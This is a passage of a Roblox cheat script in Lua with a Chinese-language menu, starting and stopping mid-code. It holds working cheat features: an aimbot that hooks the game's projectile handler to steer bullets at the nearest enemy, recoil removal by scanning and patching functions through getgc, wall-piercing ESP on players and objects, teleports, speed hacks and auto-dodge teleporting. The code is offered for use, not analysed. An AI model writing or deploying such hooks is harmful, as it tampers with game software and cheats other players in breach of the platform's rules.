	{Name = "无线电塔", Pos = Vector3.new(-376.64971923828125, -115.0693359375, 37.89384460449219)},
	{Name = "商店", Pos = Vector3.new(-108.72883605957031, -86.32909393310547, 212.69923400878906)},
	{Name = "工作间", Pos = Vector3.new(161.29835510253906, -103.65132904052734, -19.295833587646484)}
}

for _, loc in ipairs(teleportLocations) do
	TeleportSection:Button({
		Title = loc.Name,
		Callback = function()
			pcall(function()
				local char = lp.Character or lp.CharacterAdded:Wait()
				local hrp = char:WaitForChild("HumanoidRootPart")
				hrp.CFrame = CFrame.new(loc.Pos)
				WindUI:Notify({
					Title = "传送完成",
					Content = "已传送到 " .. loc.Name,
					Duration = 3,
					Icon = "check-circle"
				})
			end)
		end
	})
end

Tabs.SettingsTab = Window:Tab({
	Title = "设置",
	Icon = "settings"
})

Window:SelectTab(1)

local State = {
	AutoQTE = false,
	WinClash = false,
	InfGas = false,
	InfAmmo = false,
	BulletTrack = false,
	BulletTrail = false,
	NoRecoil = false,
	
	InfStamina = false,
	InfCombatStamina = false,
	PseudoGod = false,
	PseudoGodReturnPos = nil,
	Fullbright = false,
	FaceChain = false,
	
	AutoScrap = false,
	ScrapRange = 50,
	ScrapInterval = 6,
	AutoPower = false,
	
	ChainAlert = false,
	ChainDodge = false,
	ChainRing = true,
	ChainRotate = true,
	ChainRingRadius = 55,
	
	SpeedBoost = false,
	SpeedValue = 1,
	ThirdPerson = false,
	ThirdPersonCamLock = false,
	NoFog = false,
	Noclip = false,
	Fly = false,
	FlySpeed = 1,
	
	PlayerESP_Text = true,
	PlayerESP_Box = true,
	PlayerESP_Color = Color3.fromRGB(0, 120, 255),
	
	ChainESP_Text = true,
	ChainESP_Box = true,
	ChainESP_Color = Color3.fromRGB(255, 21, 21),
	
	BuildingESP_Text = true,
	BuildingESP_Box = true,
	BuildingESP_Color = Color3.fromRGB(255, 255, 0),
	
	ScrapESP_Text = true,
	ScrapESP_Box = true,
	ScrapESP_Color = Color3.fromRGB(255, 200, 0),
	
	AirDropESP_Text = true,
	AirDropESP_Box = true,
	AirDropESP_Color = Color3.fromRGB(170, 0, 255),
	
	ArtifactESP_Text = true,
	ArtifactESP_Box = true,
	ArtifactESP_Color = Color3.fromRGB(255, 105, 180),
	
	ServerMonitor = false,
	ServerMonitor_Interval = 30,
	ServerMonitor_MaxServers = 20,
	ServerMonitor_SortBy = "ping",
	ServerMonitor_ShowEmpty = false,
	ServerMonitor_ShowFull = false,
	ServerMonitor_AutoRefresh = true,
	
	PerformanceDisplay = false,
	HUD_Display = true,
	TeleportDelay = 0.2,
	
	-- 新增状态
	AutoDodge = false,
	GodMode = false,
}

local RemoteGUIs = { Shop = false, Deconstructor = false, Workbench = false }
local Mouse = lp:GetMouse()

local function UpdateMouseLock()
	local anyActive = RemoteGUIs.Shop or RemoteGUIs.Deconstructor or RemoteGUIs.Workbench
	local uiVisible = Window and Window.Signal and Window.Signal:GetValue()
	if anyActive or uiVisible then
		UIS.MouseBehavior = Enum.MouseBehavior.Default
		UIS.MouseIconEnabled = true
		Mouse.Icon = ""
	end
end

local function isDaytime()
	local t = valuesFolder:GetAttribute("RoundTime")
	return not (type(t) == "number" and t > 0)
end

local function SetRemoteGui(name, visible)
	if visible and name == "Shop" and not isDaytime() then
		WindUI:Notify({
			Title = "无法开启",
			Content = "商店只能在白天打开",
			Duration = 3,
			Icon = "xmark"
		})
		return false
	end
	
	RemoteGUIs[name] = visible
	local sg = lp.PlayerGui:FindFirstChild("Ingame")
	if sg then 
		local gui = sg:FindFirstChild(name) 
		if gui then gui.Visible = visible end 
	end
	UpdateMouseLock()
	return true
end

local pseudoGodData = {
	Enabled = false,
	SavedPosition = nil,
	Seat = nil
}

local bullet = { 
	TrackActive = false, 
	TrailActive = false, 
	TrailColor = Color3.fromRGB(0, 120, 255), 
	TrailLinger = 0.5 
}

local function getNearestEnemyPos()
	local char = lp.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil end
	local nearDist = math.huge
	local nearPos = nil
	for _, chain in ipairs(aiFolder:GetChildren()) do
		if chain:IsA("Model") then
			local cHRP = chain:FindFirstChild("HumanoidRootPart")
			local cHum = chain:FindFirstChild("Humanoid")
			if cHRP and cHum and cHum.Health > 0 then
				local dist = (hrp.Position - cHRP.Position).Magnitude
				if dist < nearDist then
					nearDist = dist
					nearPos = cHRP.Position
				end
			end
		end
	end
	return nearPos
end

local function createBulletTrail(from, to)
	local linger = bullet.TrailLinger or 0.5
	local part = Instance.new("Part")
	part.Anchored = true
	part.CanCollide = false
	part.Material = Enum.Material.Neon
	part.Color = bullet.TrailColor
	part.Size = Vector3.new(0.05, 0.05, (to - from).Magnitude)
	part.CFrame = CFrame.new(from, to) * CFrame.new(0, 0, -part.Size.Z / 2)
	part.Transparency = 0
	part.Parent = W
	task.spawn(function()
		local steps = 20
		local stepTime = linger / steps
		for i = 1, steps do
			task.wait(stepTime)
			part.Transparency = i / steps
		end
		part:Destroy()
	end)
end

local function setupBulletTrack()
	local success, ProjectileHandler = pcall(function()
		return require(game:GetService("ReplicatedStorage").GameStuff.Modules.ProjectileHandler)
	end)
	
	if not success or not ProjectileHandler or not ProjectileHandler.SimulateProjectile then
		WindUI:Notify({
			Title = "子弹追踪",
			Content = "无法找到ProjectileHandler模块",
			Duration = 3,
			Icon = "xmark"
		})
		return false
	end
	
	local originalSimulate = ProjectileHandler.SimulateProjectile
	local hookFunc = function(self, p135, p136, p137, p138, p139, p140, p141, p142, p143, p144, p145, p146)
		if bullet.TrackActive and p138 and p139 then
			local enemyPos = getNearestEnemyPos()
			if enemyPos then
				local firePos = p139.WorldPosition
				if bullet.TrailActive then
					createBulletTrail(firePos, enemyPos)
				end
				local newDir = (enemyPos - firePos).Unit
				local newDirs = {}
				for i = 1, #p138 do
					newDirs[i] = newDir
				end
				p138 = newDirs
			end
		end
		return originalSimulate(self, p135, p136, p137, p138, p139, p140, p141, p142, p143, p144, p145, p146)
	end
	
	if newcclosure then
		ProjectileHandler.SimulateProjectile = newcclosure(hookFunc)
	else
		ProjectileHandler.SimulateProjectile = hookFunc
	end
	return true
end

local noRecoilData = {
	Hooked = false,
	OriginalFunctions = {},
	TableRef = nil
}

local function hookRecoil()
	if noRecoilData.Hooked then return end
	pcall(function()
		for _, v in pairs(getgc(true)) do
			if type(v) == "table" and rawget(v, "AKRecoil") then
				noRecoilData.TableRef = v
				for _, fname in ipairs({"AKRecoil", "DeagleRecoil", "M1911Recoil", "DBRecoil", "CamShake1", "Shake"}) do
					if rawget(v, fname) and type(rawget(v, fname)) == "function" then
						noRecoilData.OriginalFunctions[fname] = rawget(v, fname)
						rawset(v, fname, function() end)
					end
				end
				noRecoilData.Hooked = true
				break
			end
		end
	end)
end

local function restoreRecoil()
	if not noRecoilData.TableRef then return end
	pcall(function()
		for fname, origFunc in pairs(noRecoilData.OriginalFunctions) do
			rawset(noRecoilData.TableRef, fname, origFunc)
		end
		noRecoilData.OriginalFunctions = {}
		noRecoilData.Hooked = false
		noRecoilData.TableRef = nil
	end)
end

local ESPFolder = Instance.new("Folder")
ESPFolder.Name = "ESP"
ESPFolder.Parent = game:GetService("CoreGui")

local ESPList = {}
local ESP = {}

function ESP:Add(config)
	local entity = config.Entity
	if not entity then return nil end
	
	local part = config.Part
	if not part then
		if entity:IsA("Player") then
			local char = entity.Character
			part = char and char:FindFirstChild("HumanoidRootPart")
		elseif entity:IsA("Model") then
			part = entity:FindFirstChild("HumanoidRootPart") or entity.PrimaryPart
			if not part then part = entity:FindFirstChildWhichIsA("BasePart", true) end
		elseif entity:IsA("BasePart") then
			part = entity
		end
	end
	if not part then return nil end
	
	local cfg = {
		Name = config.Name or entity.Name,
		Color = config.Color or Color3.fromRGB(255, 255, 255),
		Highlight = config.Highlight ~= false,
		Box = config.Box == true,
		Text = config.Text ~= false,
		Distance = config.Distance ~= false,
		Info = config.Info or nil,
		TextSize = config.TextSize or 14,
		AlwaysOnTop = config.AlwaysOnTop ~= false,
		StudsOffset = config.StudsOffset or Vector3.new(0, 3, 0),
		BillboardSize = config.BillboardSize or UDim2.new(0, 200, 0, 40),
	}
	
	local d = {
		Entity = entity, Part = part, Config = cfg, Enabled = true,
		HL = nil, Box = nil, Gui = nil, NL = nil, DL = nil, IL = nil
	}
	
	if cfg.Highlight then
		local hlTarget = entity
		if entity:IsA("Player") and entity.Character then hlTarget = entity.Character end
		pcall(function() 
			local old = hlTarget:FindFirstChildOfClass("Highlight") 
			if old then old:Destroy() end 
		end)
		local hl = Instance.new("Highlight")
		hl.FillColor = cfg.Color
		hl.OutlineColor = cfg.Color
		hl.FillTransparency = 0.6
		hl.OutlineTransparency = 0.1
		if cfg.AlwaysOnTop then hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end
		hl.Parent = hlTarget
		d.HL = hl
	end

	if Drawing then
		d.Box = Drawing.new("Square")
		d.Box.Thickness = 1
		d.Box.Filled = false
		d.Box.Visible = false
	end

	local ap = part
	if entity:IsA("Player") and entity.Character then
		local hd = entity.Character:FindFirstChild("Head")
		if hd then ap = hd end
	end

	local gui = Instance.new("BillboardGui")
	gui.Size = cfg.BillboardSize
	gui.StudsOffset = cfg.StudsOffset
	gui.AlwaysOnTop = true
	gui.Adornee = ap
	gui.Parent = ESPFolder
	
	local nl = Instance.new("TextLabel")
	nl.Size = UDim2.new(1, 0, 0, cfg.TextSize + 4)
	nl.BackgroundTransparency = 1
	nl.Text = cfg.Name
	nl.TextColor3 = cfg.Color
	nl.TextStrokeTransparency = 0
	nl.TextSize = cfg.TextSize
	nl.Font = Enum.Font.SourceSansBold
	nl.Parent = gui
	
	local dl = Instance.new("TextLabel")
	dl.Size = UDim2.new(1, 0, 0, cfg.TextSize)
	dl.Position = UDim2.new(0, 0, 0, cfg.TextSize + 2)
	dl.BackgroundTransparency = 1
	dl.Text = "0m"
	dl.TextColor3 = cfg.Color
	dl.TextStrokeTransparency = 0
	dl.TextSize = cfg.TextSize - 2
	dl.Font = Enum.Font.SourceSans
	dl.Parent = gui
	
	local il = Instance.new("TextLabel")
	il.Size = UDim2.new(1, 0, 0, cfg.TextSize)
	il.Position = UDim2.new(0, 0, 0, cfg.TextSize * 2 + 2)
	il.BackgroundTransparency = 1
	il.Text = ""
	il.TextColor3 = Color3.new(1, 1, 1)
	il.TextStrokeTransparency = 0
	il.TextSize = cfg.TextSize - 2
	il.Font = Enum.Font.SourceSans
	il.Visible = false
	il.Parent = gui
	
	d.Gui = gui
	d.NL = nl
	d.DL = dl
	d.IL = il
	
	function d:SetText(t) 
		cfg.Name = t 
		if d.NL then d.NL.Text = t end 
	end
	
	function d:SetColor(c)
		cfg.Color = c
		if d.HL then d.HL.FillColor = c; d.HL.OutlineColor = c end
		if d.NL then d.NL.TextColor3 = c end
		if d.DL then d.DL.TextColor3 = c end
		if d.Box then d.Box.Color = c end
	end
	
	function d:SetEnabled(v)
		d.Enabled = v
		if not v then
			if d.HL then d.HL.Enabled = false end
			if d.Gui then d.Gui.Enabled = false end
			if d.Box then d.Box.Visible = false end
		end
	end
	
	function d:SetInfo(t)
		cfg.Info = t
		if d.IL then
			if t and t ~= "" then 
				d.IL.Text = t
				d.IL.Visible = true
			else 
				d.IL.Visible = false 
			end
		end
	end
	
	function d:SetPart(p) d.Part = p end
	function d:SetConfig(key, val) cfg[key] = val end
	function d:Remove()
		if d.HL then pcall(function() d.HL:Destroy() end) end
		if d.Gui then pcall(function() d.Gui:Destroy() end) end
		if d.Box then pcall(function() d.Box:Remove() end) end
		ESPList[d] = nil
	end
	
	ESPList[d] = true
	return d
end

function ESP:RemoveAll()
	for d in pairs(ESPList) do
		if d.HL then pcall(function() d.HL:Destroy() end) end
		if d.Gui then pcall(function() d.Gui:Destroy() end) end
		if d.Box then pcall(function() d.Box:Remove() end) end
		ESPList[d] = nil
	end
end

function ESP:SetColor(c)
	for d in pairs(ESPList) do
		if d.Config then d.Config.Color = c end
		if d.HL then d.HL.FillColor = c; d.HL.OutlineColor = c end
		if d.NL then d.NL.TextColor3 = c end
		if d.DL then d.DL.TextColor3 = c end
		if d.Box then d.Box.Color = c end
	end
end

local espObjects = {
	Players = {},
	Chains = {},
	Buildings = {},
	Scraps = {},
	AirDrops = {},
	Artifacts = {}
}

local function findArtifacts()
	local artifacts = {}
	for _, obj in ipairs(W:GetDescendants()) do
		if obj:IsA("BasePart") or obj:IsA("Model") then
			local name = string.lower(obj.Name)
			if string.find(name, "神器") or string.find(name, "文物") 
			   or string.find(name, "artifact") or string.find(name, "relic") then
				table.insert(artifacts, obj)
			end
		end
	end
	return artifacts
end

RS.RenderStepped:Connect(function()
	Cam = W.CurrentCamera
	local lc = lp.Character
	local lhrp = lc and lc:FindFirstChild("HumanoidRootPart")
	
	local toRemove = {}
	for d in pairs(ESPList) do
		local e = d.Entity
		if not e or not e.Parent then
			table.insert(toRemove, d)
		end
	end
	for _, d in ipairs(toRemove) do
		d:Remove()
	end
	
	if State.ChainESP then
		for _, chain in ipairs(aiFolder:GetChildren()) do
			if chain:IsA("Model") and chain:FindFirstChild("Humanoid") then
				if not espObjects.Chains[chain] then
					local hrp = chain:FindFirstChild("HumanoidRootPart")
					if hrp then
						espObjects.Chains[chain] = ESP:Add({
							Entity = chain,
							Part = hrp,
							Name = chain.Name,
							Color = State.ChainESP_Color,
							Highlight = true,
							Box = true,
							Text = true,
							Distance = true,
							AlwaysOnTop = true,
							StudsOffset = Vector3.new(0, 3.5, 0),
							BillboardSize = UDim2.new(0, 300, 0, 60),
						})
					end
				end
			end
		end
	end
	
	if State.ScrapESP then
		for _, scrap in ipairs(ScrapFolder:GetChildren()) do
			if scrap:IsA("Model") and scrap:GetAttribute("Scrap") then
				local hasPart = false
				for _, descendant in ipairs(scrap:GetDescendants()) do
					if descendant:IsA("BasePart") then
						hasPart = true
						break
					end
				end
				if hasPart and not espObjects.Scraps[scrap] then
					local pivot = scrap:GetPivot()
					local _, bsize = scrap:GetBoundingBox()
					
					local anchorPart = Instance.new("Part")
					anchorPart.Anchored = true
					anchorPart.CanCollide = false
					anchorPart.CanTouch = false
					anchorPart.CanQuery = false
					anchorPart.Transparency = 1
					anchorPart.Size = bsize
					anchorPart.CFrame = pivot
					anchorPart.Parent = W
					
					espObjects.Scraps[scrap] = {
						Obj = ESP:Add({
							Entity = scrap,
							Part = anchorPart,
							Name = "废料",
							Color = State.ScrapESP_Color,
							Highlight = true,
							Box = true,
							Text = true,
							Distance = true,
							AlwaysOnTop = true,
							StudsOffset = Vector3.new(0, 2.5, 0),
						}),
						Part = anchorPart
					}
				end
			end
		end
	end
	
	if State.PlayerESP then
		for _, player in ipairs(P:GetPlayers()) do
			if player ~= lp then
				if not espObjects.Players[player] then
					pcall(function()
						local char = player.Character or player.CharacterAdded:Wait()
						local hrp = char:WaitForChild("HumanoidRootPart", 5)
						if hrp then
							espObjects.Players[player] = ESP:Add({
								Entity = player,
								Part = hrp,
								Name = player.Name,
								Color = State.PlayerESP_Color,
								Highlight = true,
								Box = true,
								Text = true,
								Distance = true,
								AlwaysOnTop = false,
							})
						end
					end)
				end
			end
		end
	end
	
	if State.BuildingESP then
		local buildings = {
			{Name = "发电站", Model = GameSections:FindFirstChild("POWERSTATION")},
			{Name = "仓库", Model = GameSections:FindFirstChild("WAREHOUSE")},
			{Name = "工作区", Model = GameSections:FindFirstChild("WORKSHOP")}
		}
		for _, building in ipairs(buildings) do
			if building.Model and not espObjects.Buildings[building.Model] then
				local pivot = building.Model:GetPivot()
				local _, bsize = building.Model:GetBoundingBox()
				
				local anchorPart = Instance.new("Part")
				anchorPart.Anchored = true
				anchorPart.CanCollide = false
				anchorPart.CanTouch = false
				anchorPart.CanQuery = false
				anchorPart.Transparency = 1
				anchorPart.Size = bsize
				anchorPart.CFrame = pivot
				anchorPart.Parent = W
				
				espObjects.Buildings[building.Model] = {
					Obj = ESP:Add({
						Entity = building.Model,
						Part = anchorPart,
						Name = building.Name,
						Color = State.BuildingESP_Color,
						Highlight = true,
						Box = true,
						Text = true,
						Distance = true,
						AlwaysOnTop = true,
						StudsOffset = Vector3.new(0, 5, 0),
						BillboardSize = UDim2.new(0, 300, 0, 50),
					}),
					Part = anchorPart
				}
			end
		end
	end
	
	if State.AirDropESP then
		local AirDropsFolder = GameSections:FindFirstChild("AirDrops")
		if AirDropsFolder then
			for _, heli in ipairs(AirDropsFolder:GetChildren()) do
				if heli.Name == "AirDropHeli" then
					local airdrop = heli:FindFirstChildWhichIsA("Model", true) or heli
					if not espObjects.AirDrops[airdrop] then
						local hrp = airdrop:FindFirstChild("HumanoidRootPart") or airdrop.PrimaryPart
						if hrp then
							espObjects.AirDrops[airdrop] = ESP:Add({
								Entity = airdrop,
								Part = hrp,
								Name = "空投",
								Color = State.AirDropESP_Color,
								Highlight = true,
								Box = true,
								Text = true,
								Distance = true,
								AlwaysOnTop = true,
								StudsOffset = Vector3.new(0, 5, 0),
							})
						end
					end
				end
			end
		end
	end
	
	for d in pairs(ESPList) do
		local e = d.Entity
		local p = d.Part
		local c = d.Config
		
		if not p or not p.Parent then
			d:SetEnabled(false)
		else
			local alive = true
			if e:IsA("Player") then
				local hum = e.Character and e.Character:FindFirstChild("Humanoid")
				alive = hum and hum.Health > 0
			elseif e:IsA("Model") then
				local hum = e:FindFirstChild("Humanoid")
				if hum then alive = hum.Health > 0 end
			end
			
			if not d.Enabled or not alive then
				d:SetEnabled(false)
			else
				if c.Highlight and not d.HL then
					local hlTarget = e
					if e:IsA("Player") and e.Character then hlTarget = e.Character end
					pcall(function()
						local hl = Instance.new("Highlight")
						hl.FillColor = c.Color
						hl.OutlineColor = c.Color
						hl.FillTransparency = 0.6
						hl.OutlineTransparency = 0.1
						if c.AlwaysOnTop then hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end
						hl.Parent = hlTarget
						d.HL = hl
					end)
				end
				
				local sp, onScr = Cam:WorldToViewportPoint(p.Position)
				
				if d.NL and d.DL then
					d.NL.Text = c.Name
					d.NL.TextColor3 = c.Color
					d.DL.TextColor3 = c.Color
					
					if c.Distance and lhrp then
						local dist = math.floor((lhrp.Position - p.Position).Magnitude)
						d.DL.Text = tostring(dist) .. "m"
						d.DL.Visible = true
					else
						d.DL.Visible = false
					end
				end
				
				if e:IsA("Model") and e:FindFirstChild("Humanoid") then
					local attrs = e:GetAttributes()
					local infoStr = ""
					if attrs.Anger then infoStr = infoStr .. "怒气:" .. string.format("%.1f", attrs.Anger) .. " " end
					if attrs.ChokeMeter then infoStr = infoStr .. "窒息:" .. string.format("%.1f", attrs.ChokeMeter) .. "% " end
					if attrs.Burst then infoStr = infoStr .. "重击:" .. string.format("%.1f", attrs.Burst) end
					d:SetInfo(infoStr)
				end
				
				if c.Box and d.Box then
					local cf, sz
					local char = e:IsA("Player") and e.Character or e
					
					if e:IsA("Model") and e.Name:lower():find("chain") then
						local hrp = e:FindFirstChild("HumanoidRootPart")
						if hrp then
							cf = hrp.CFrame
							sz = Vector3.new(4, 6, 4)
						end
					elseif char and char:IsA("Model") then
						local okBB, rcf, rsz = pcall(char.GetBoundingBox, char)
						if okBB and rcf then cf, sz = rcf, rsz end
					end
					
					if not cf then cf = p.CFrame; sz = p.Size end
					
					local corners = {
						cf * CFrame.new(-sz.X/2, -sz.Y/2, -sz.Z/2),
						cf * CFrame.new(sz.X/2, -sz.Y/2, -sz.Z/2),
						cf * CFrame.new(sz.X/2, sz.Y/2, -sz.Z/2),
						cf * CFrame.new(-sz.X/2, sz.Y/2, -sz.Z/2),
						cf * CFrame.new(-sz.X/2, -sz.Y/2, sz.Z/2),
						cf * CFrame.new(sz.X/2, -sz.Y/2, sz.Z/2),
						cf * CFrame.new(sz.X/2, sz.Y/2, sz.Z/2),
						cf * CFrame.new(-sz.X/2, sz.Y/2, sz.Z/2),
					}
					
					local x1, y1 = math.huge, math.huge
					local x2, y2 = -math.huge, -math.huge
					local boxVis = false
					
					for _, cn in ipairs(corners) do
						local s, o = Cam:WorldToViewportPoint(cn.Position)
						if o then 
							boxVis = true
							x1 = math.min(x1, s.X)
							y1 = math.min(y1, s.Y)
							x2 = math.max(x2, s.X)
							y2 = math.max(y2, s.Y)
						end
					end
					
					if boxVis then
						d.Box.Position = Vector2.new(x1, y1)
						d.Box.Size = Vector2.new(x2 - x1, y2 - y1)
						d.Box.Color = c.Color
						d.Box.Visible = true
					else
						d.Box.Visible = false
					end
				elseif d.Box then
					d.Box.Visible = false
				end
			end
		end
	end
end)

P.PlayerAdded:Connect(function(player)
	if State.PlayerESP and player ~= lp then
		pcall(function()
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart", 5)
			if hrp then
				if espObjects.Players[player] then
					espObjects.Players[player]:Remove()
				end
				espObjects.Players[player] = ESP:Add({
					Entity = player,
					Part = hrp,
					Name = player.Name,
					Color = State.PlayerESP_Color,
					Highlight = true,
					Box = true,
					Text = true,
					Distance = true,
					AlwaysOnTop = false,
				})
			end
		end)
	end
end)

P.PlayerRemoving:Connect(function(player)
	if espObjects.Players[player] then
		espObjects.Players[player]:Remove()
		espObjects.Players[player] = nil
	end
end)

local cAlert = { 
	Active = false, 
	Notify = true, 
	Dodge = false, 
	ShowRing = true, 
	RingRotating = true, 
	RingColor = Color3.fromRGB(255, 50, 50),
	RingRadius = 55
}

local chainAlertAnims = {
	["rbxassetid://11545349261"] = "连击1",
	["rbxassetid://14123467583"] = "连击2",
	["rbxassetid://14101304975"] = "连击3",
	["rbxassetid://14101956641"] = "背后攻击",
	["rbxassetid://15943264089"] = "蓄力斩击",
	["rbxassetid://14401168075"] = "蓄力冲锋",
	["rbxassetid://14875631059"] = "范围攻击",
	["rbxassetid://11987922371"] = "闪避",
	["rbxassetid://14255769487"] = "破门",
	["rbxassetid://15408077041"] = "倒地处决1",
	["rbxassetid://15409393739"] = "倒地处决2",
	["rbxassetid://11442109170"] = "警觉",
	["rbxassetid://123029648649398"] = "空洞警觉",
	["rbxassetid://78440647847406"] = "蓄力",
	["rbxassetid://88813113168837"] = "蓄力跳斩",
	["rbxassetid://135099305543293"] = "暴怒",
	["rbxassetid://140464711815827"] = "暴怒反击",
	["rbxassetid://16214202640"] = "突刺",
}

local chainStateAnims = {
	["rbxassetid://11442109170"] = true,
	["rbxassetid://123029648649398"] = true,
	["rbxassetid://135099305543293"] = true,
}

local chainAlertSounds = {
	["CurbStomp1"] = "踩踏反击",
	["CurbStomp2"] = "踩踏反击",
	["Charging"] = "蓄力",
	["ChainsawSwing"] = "电锯挥砍",
	["ChainsawCharge"] = "电锯蓄力",
	["ChainsawSpot"] = "电锯突刺",
	["ChokeSwing"] = "突刺",
}

local chainRings = {}
local chainRingConn = nil
local RING_POINTS = 36
local WALL_HEIGHT = 50
local ringRotAngle = 0
local activeDodgeChains = {}

local function makeRingParts(radius)
	local data = { Balls = {}, Walls = {} }
	
	for i = 1, RING_POINTS do
		local ball = Instance.new("Part")
		ball.Shape = Enum.PartType.Ball
		ball.Size = Vector3.new(0.5, 0.5, 0.5)
		ball.Anchored = true
		ball.CanCollide = false
		ball.Material = Enum.Material.Neon
		ball.Color = cAlert.RingColor
		ball.Transparency = cAlert.ShowRing and 0.3 or 1
		ball.Parent = W
		table.insert(data.Balls, ball)
	end
	
	for i = 1, RING_POINTS do
		local wall = Instance.new("Part")
		wall.Size = Vector3.new(2, WALL_HEIGHT, 1)
		wall.Anchored = true
		wall.CanCollide = false
		wall.Material = Enum.Material.ForceField
		wall.Color = cAlert.RingColor
		wall.Transparency = cAlert.ShowRing and 0.85 or 1
		wall.Parent = W
		table.insert(data.Walls, wall)
	end
	
	return data
end

local function updateRingPositions(ringData, chain, radius)
	local hrp = chain:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	
	local center = hrp.Position
	
	for i, ball in ipairs(ringData.Balls) do
		local angle = (i / RING_POINTS) * math.pi * 2 + ringRotAngle
		ball.Position = Vector3.new(
			center.X + math.cos(angle) * radius,
			center.Y - 2.5,
			center.Z + math.sin(angle) * radius
		)
	end
	
	for i, wall in ipairs(ringData.Walls) do
		local angle = (i / RING_POINTS) * math.pi * 2 + ringRotAngle
		wall.Position = Vector3.new(
			center.X + math.cos(angle) * radius,
			center.Y + WALL_HEIGHT / 2 - 15,
			center.Z + math.sin(angle) * radius
		)
		wall.CFrame = CFrame.new(wall.Position, center)
	end
end

local function clearSingleChainRing(chain)
	for i = #chainRings, 1, -1 do
		local d = chainRings[i]
		if d.Chain == chain then
			for _, p in ipairs(d.Parts.Balls) do pcall(function() p:Destroy() end) end
			for _, p in ipairs(d.Parts.Walls) do pcall(function() p:Destroy() end) end
			table.remove(chainRings, i)
			activeDodgeChains[chain] = nil
			break
		end
	end
end

local function clearChainRings()
	for _, d in ipairs(chainRings) do
		for _, p in ipairs(d.Parts.Balls) do pcall(function() p:Destroy() end) end
		for _, p in ipairs(d.Parts.Walls) do pcall(function() p:Destroy() end) end
	end
	chainRings = {}
	activeDodgeChains = {}
	if chainRingConn then chainRingConn:Disconnect(); chainRingConn = nil end
end

local function createChainRings()
	clearChainRings()
	
	for _, chain in ipairs(aiFolder:GetChildren()) do
		if chain:IsA("Model") then
			table.insert(chainRings, {
				Chain = chain,
				Parts = makeRingParts(cAlert.RingRadius)
			})
		end
	end
	
	ringRotAngle = 0
	chainRingConn = RS.RenderStepped:Connect(function(dt)
		if cAlert.RingRotating then 
			ringRotAngle = ringRotAngle + dt * 0.5 
		end
		
		local toRemove = {}
		for idx, d in ipairs(chainRings) do
			local chain = d.Chain
			if not chain or not chain.Parent then
				table.insert(toRemove, idx)
			else
				updateRingPositions(d.Parts, chain, cAlert.RingRadius)
				
				local hrp = chain:FindFirstChild("HumanoidRootPart")
				if hrp and cAlert.Dodge then
					local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
					if myHRP then
						local dist = (myHRP.Position - hrp.Position).Magnitude
						if dist < cAlert.RingRadius then
							local dir = (myHRP.Position - hrp.Position).Unit
							myHRP.CFrame = CFrame.new(hrp.Position + dir * (cAlert.RingRadius + 10))
						end
					end
				end
			end
		end
		
		for i = #toRemove, 1, -1 do 
			local d = chainRings[toRemove[i]]
			for _, p in ipairs(d.Parts.Balls) do pcall(function() p:Destroy() end) end
			for _, p in ipairs(d.Parts.Walls) do pcall(function() p:Destroy() end) end
			table.remove(chainRings, toRemove[i])
		end
	end)
end

local function triggerChainAlert(chain, skillName)
	if cAlert.Notify then
		WindUI:Notify({
			Title = "Chain 预警",
			Content = chain.Name .. " 使用 " .. skillName,
			Duration = 2,
			Icon = "alert-triangle"
		})
	end
	activeDodgeChains[chain] = tick()
	if cAlert.Dodge then
		local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
		local chainHRP = chain:FindFirstChild("HumanoidRootPart")
		if myHRP and chainHRP then
			local dir = (myHRP.Position - chainHRP.Position).Unit
			myHRP.CFrame = CFrame.new(chainHRP.Position + dir * (cAlert.RingRadius + 10))
		end
	end
end

local chainAlertConns = {}

local function hookChainAnim(chain)
	if not chain:IsA("Model") then return end
	local isInState = false
	local hum = chain:FindFirstChild("Humanoid")
	local animator = hum and hum:FindFirstChild("Animator")
	if animator then
		table.insert(chainAlertConns, animator.AnimationPlayed:Connect(function(track)
			local animId = track.Animation and track.Animation.AnimationId or ""
			local cleanId = animId:match("%d+")
			local fullId = "rbxassetid://" .. (cleanId or "")
			local skillName = chainAlertAnims[fullId]
			if skillName then
				if chainStateAnims[fullId] then
					isInState = true
					track.Stopped:Connect(function() isInState = false end)
				else
					triggerChainAlert(chain, skillName)
					track.Stopped:Connect(function() activeDodgeChains[chain] = nil end)
				end
			end
		end))
	end
	for _, desc in ipairs(chain:GetDescendants()) do
		if desc:IsA("Sound") and chainAlertSounds[desc.Name] then
			table.insert(chainAlertConns, desc.Played:Connect(function()
				if not isInState then
					triggerChainAlert(chain, chainAlertSounds[desc.Name])
				end
			end))
		end
	end
end

local function setupChainAlert()
	for _, conn in ipairs(chainAlertConns) do conn:Disconnect() end
	chainAlertConns = {}
	clearChainRings()
	
	if cAlert.Active then
		createChainRings()
		for _, chain in ipairs(aiFolder:GetChildren()) do hookChainAnim(chain) end
		table.insert(chainAlertConns, aiFolder.ChildAdded:Connect(function(child)
			hookChainAnim(child)
			if child:IsA("Model") then
				table.insert(chainRings, {
					Chain = child,
					Parts = makeRingParts(cAlert.RingRadius)
				})
			end
		end))
		table.insert(chainAlertConns, aiFolder.ChildRemoved:Connect(function(child)
			clearSingleChainRing(child)
		end))
	end
end

local speedData = { Active = false, Speed = 1, Conn = nil, CharConn = nil }

local function startSpeedBoost()
	if speedData.Conn then speedData.Conn:Disconnect() end
	speedData.Conn = RS.RenderStepped:Connect(function(delta)
		if not speedData.Active then return end
		local char = lp.Character
		if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildWhichIsA("Humanoid")
		if not hrp or not hum then return end
		if hum.MoveDirection.Magnitude > 0 then
			hrp.CFrame = hrp.CFrame + hum.MoveDirection * speedData.Speed * delta * 20
		end
	end)
end

local function setupSpeedBoost()
	if speedData.CharConn then speedData.CharConn:Disconnect() end
	speedData.CharConn = lp.CharacterAdded:Connect(function(char)
		task.wait(0.5)
		if speedData.Active then startSpeedBoost() end
	end)
	if speedData.Active then startSpeedBoost() end
end

local tp3 = { Active = false, CamLock = false, CamLockConn = null, Conn = null, CharConn = null, SavedMax = null, SavedMin = null }

local function enforceThirdPerson()
	if tp3.Conn then tp3.Conn:Disconnect() end
	tp3.Conn = RS.RenderStepped:Connect(function()
		if not tp3.Active then return end
		pcall(function()
			if lp.CameraMode ~= Enum.CameraMode.Classic then lp.CameraMode = Enum.CameraMode.Classic end
